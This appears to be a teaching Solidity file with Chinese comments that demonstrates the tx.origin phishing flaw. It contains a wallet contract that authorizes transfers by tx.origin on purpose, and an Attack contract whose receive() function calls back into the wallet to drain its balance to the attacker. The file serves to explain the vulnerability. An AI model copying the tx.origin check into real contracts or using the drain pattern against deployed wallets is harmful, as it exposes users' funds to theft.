pragma solidity 0.8.11;

import "hardhat/console.sol";

// MyWallet合约地址：0x7b96aF9Bd211cBf6BA5b0dd53aa61Dc5806b6AcE
contract MyWallet {
    address owner1;
    constructor() payable {
        // owner1 = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
        owner1 = msg.sender;
        console.log("owner1: ", owner1);
    }

    receive() external payable {}

    // tx.origin的值仍然是那个外部账户（即攻击者的账户），而不是Attack合约。
    // 这是因为tx.origin表示的是交易的原始发起者，即第一个（也是最终的）交易发起者
    // dest表示Attack合约地址
    function transferTo(address payable dest, uint _mount) public {
        // 执行dest.call{value: _mount}("")语句前
        // tx.origin: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 
        // owner1: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
        // msg.sender: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 

        // 执行dest.call{value: _mount}("")语句后
        // tx.origin: : 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
        // owner1: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
        // msg.sender: 0x5802016Bc9976C6f63D6170157adAeA1924586c1
        console.log("tx.origin: : ", tx.origin, " owner1: ",owner1);
        console.log("msg.sender: ", msg.sender);
        require(tx.origin == owner1);
        (bool success, ) = dest.call{value: _mount}("");
        require(success);
    }
}

interface UserWallet {
    function transferTo(address payable dest, uint _amount) external ;
}

// Attack合约地址：0x5802016Bc9976C6f63D6170157adAeA1924586c1
contract Attack {
    address payable owner2;
    constructor() payable {
        // owner2 = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2
        owner2 = payable(msg.sender);
        console.log("owner2: ", owner2);
    }

    // 部署MyWallet合约的外部账户调用TransferTo方法时，不是把以太币转给Attack合约，
    // 而是转给部署Attack合约的外部账户
    receive() payable external{
        // 这里的msg.sender指向MyWallet合约的地址 
        // msg.sender = 0x7b96aF9Bd211cBf6BA5b0dd53aa61Dc5806b6AcE  
        // owner2 = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2
        console.log("msg.sender: ", msg.sender, " msg.value: ", msg.value);
        console.log("owner2: ", owner2);
        UserWallet(msg.sender).transferTo(owner2, msg.sender.balance - msg.value);
    }
}